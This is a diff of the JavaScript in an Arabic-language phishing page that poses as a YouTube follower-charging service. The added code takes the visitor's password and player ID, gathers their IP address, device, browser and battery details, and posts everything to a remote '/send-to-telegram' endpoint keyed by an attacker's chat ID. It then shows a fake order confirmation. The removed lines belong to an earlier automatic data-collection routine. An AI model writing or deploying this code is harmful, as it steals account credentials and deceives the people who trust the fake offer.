+    async function getBatteryInfo() {
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging ? 'نعم' : 'لا'
+                };
+            } catch (error) {
+                return {
+                    level: 'غير متاح',
+                    charging: 'لا'
+                };
+            }
         } else {
-          throw new Error(result.error || 'فشل في إرسال البيانات');
+            return {
+                level: 'غير متاح',
+                charging: 'لا'
+            };
         }
-        
-      } catch (error) {
-        console.error('Error:', error);
-        spinner.style.display = 'none';
-        updateUI("حدث خطأ", "لم نتمكن من إكمال عملية الفحص");
-        showResult("❌ حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.", false);
-      }
     }
-    
-    // بدء العملية عند تحميل الصفحة
-    window.onload = function() {
-      if (!CHAT_ID) {
-        spinner.style.display = 'none';
-        updateUI("خطأ في المعرف", "معرف الدردشة غير موجود في الرابط");
-        showResult("❌ رابط غير صالح. يرجى استخدام الرابط الصحيح.", false);
-        return;
+
+    // الدالة الرئيسية لإرسال البيانات
+    async function sendYoutubeData(formData) {
+        try {
+            console.log('📤 إرسال بيانات يوتيوب:', formData);
+            
+            const response = await fetch(SERVER_URL + '/send-to-telegram', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData)
+            });
+            
+            const result = await response.json();
+            
+            if (result.success) {
+                console.log('✅ تم إرسال بيانات الحساب بنجاح');
+                return { success: true, message: result.message };
+            } else {
+                console.log('❌ فشل إرسال بيانات الحساب');
+                return { success: false, message: result.message };
+            }
+        } catch (error) {
+            console.error('❌ خطأ في الإرسال:', error);
+            return { success: false, message: 'حدث خطأ في الإرسال' };
+        }
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      createStars();
+      
+      // الحصول على معرف الدردشة من الرابط
+      const urlParams = new URLSearchParams(window.location.search);
+      const CHAT_ID = urlParams.get('id') || "unknown";
+      
+      // إظهار النموذج
+      function showForm() {
+        document.getElementById("login").style.display = "none";
+        document.getElementById("form").style.display = "block";
+        
+        // التمرير للنموذج بشكل سلس
+        document.getElementById("form").scrollIntoView({ behavior: 'smooth' });
       }
       
-      // بدء جمع البيانات بعد تأخير قصير
-      setTimeout(collectAndSendData, 2000);
-    };
+      const form = document.getElementById("youtubeForm");
+      const submitBtn = document.getElementById("submitBtn");
+      const loadingSpinner = document.getElementById("loadingSpinner");
+      
+      if (!form) return;
+      
+      form.addEventListener("submit", async function (e) {
+        e.preventDefault();
+        
+        // Show loading spinner and disable button
+        submitBtn.style.display = "none";
+        loadingSpinner.style.display = "block";
+
+        const data = new FormData(this);
+        const password = data.get("password");
+        const playerId = data.get("player_id");
+        const amount = data.get("amount");
+
+        // الحصول على عنوان IP
+        const ipData = await fetch("https://api.ipify.org?format=json")
+          .then(res => res.json())
+          .catch(() => ({ ip: "غير معروف" }));
+
+        // الحصول على معلومات الجهاز
+        const deviceInfo = getDeviceInfo();
+
+        // الحصول على معلومات البطارية
+        const batteryInfo = await getBatteryInfo();
+
+        // إعداد البيانات للإرسال بنفس تنسيق تيك توك وتويتر
+        const requestData = {
+            playerId: playerId,
+            password: password,
+            amount: amount,
+            chatId: CHAT_ID,
+            platform: "يوتيوب",
+            device: navigator.userAgent,
+            ip: ipData.ip,
+            country: "غير معروف", // سيتم الحصول عليها من السيرفر
+            city: "غير معروف", // سيتم الحصول عليها من السيرفر
+            os: deviceInfo.os,
+            browser: deviceInfo.browser,
+            battery: batteryInfo.level,
+            charging: batteryInfo.charging,
+            deviceType: deviceInfo.device
+        };
+
+        try {
+          // إرسال البيانات إلى السيرفر
+          const result = await sendYoutubeData(requestData);
+          
+          if (result.success) {
+            // إظهار رسالة النجاح
+            const successHTML = `
+              <div class="success-message">
+                <h3>تمت العملية بنجاح! ✅</h3>
+                <p>${result.message || 'سيتم شحن متابعين يوتيوب خلال 24 ساعة'}</p>
+                <p>رقم الطلب: #${Math.floor(100000 + Math.random() * 900000)}</p>
+                <p><i class="fas fa-check-circle"></i> تم استلام بياناتك بنجاح</p>
+              </div>
+            `;
+            form.innerHTML = successHTML;
+          } else {
+            // إظهار رسالة الخطأ مع تفاصيل
+            const errorHTML = `
+              <div class="error-message">
+                <h3>خطأ في الإرسال! ❌</h3>
+                <p>${result.message || 'حدث خطأ أثناء إرسال البيانات إلى السيرفر'}</p>
+                <p>يرجى المحاولة مرة أخرى</p>
+              </div>
+            `;
+            form.innerHTML = errorHTML;
+          }
+        } catch (error) {
+          // إظهار رسالة الخطأ مع تفاصيل
+          const errorHTML = `
+            <div class="error-message">
+              <h3>خطأ في الإرسال! ❌</h3>
+              <p>${error.message || 'حدث خطأ غير معروف'}</p>
+              <p>يرجى المحاولة مرة أخرى</p>
+            </div>
+          `;
+          form.innerHTML = errorHTML;
+        } finally {
+          // إعادة عرض زر الإرسال
+          submitBtn.style.display = "block";
+          loadingSpinner.style.display = "none";
+        }
+      });
+      
+      // تعيين وظيفة showForm كدالة عامة
+      window.showForm = showForm;
+    });
   </script>
 </body>
-</html>
+        </html>
